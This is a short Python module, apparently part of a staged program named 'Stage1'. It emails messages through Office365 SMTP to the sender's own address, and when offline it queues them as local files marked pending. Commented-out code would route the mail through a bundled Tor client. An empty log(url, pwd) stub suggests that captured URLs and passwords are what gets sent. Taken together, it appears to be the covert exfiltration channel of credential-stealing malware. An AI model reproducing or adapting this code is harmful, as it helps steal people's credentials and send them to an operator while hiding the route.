import Stage1.GlobalVariables as Var
import Stage1.Download as Download
import smtplib
from time import strftime, gmtime
import socks
import os
import subprocess
from threading import Timer


def log(url, pwd):
    pass


def send_mail(process, email, password, message):
    try:
        # subprocess.run([Var.nt_format(Var.tor_root) + "tor.exe"], shell=False)
        # os.system(Var.nt_format(Var.tor_root) + "explorer.exe")
        # socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
        # s = socks.wrap_module(smtplib)
        server = smtplib.SMTP(host="smtp.office365.com", port=587, timeout=300)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        return True
    except ConnectionError:
        try:
            Download.mk_dir(Var.log_roots)
            with open(Var.nt_format(Var.log_root) + process+"_" + strftime("%Y-%m-%d_%H-%M-%S", gmtime()), "wb") as msg:
                msg.write(message)
                msg.close()
                try:
                    with open(Var.nt_format(Var.log_root) + "pending", "w") as f:
                        f.write(Var.log_root + process + "_" + strftime("%Y-%m-%d_%H-%M-%S", gmtime()) + "\n")
                        f.close()
                        return True
                except:
                    return False

        except:
            return False


# if __name__ == "__main__":
 #   __name__ = "Log"
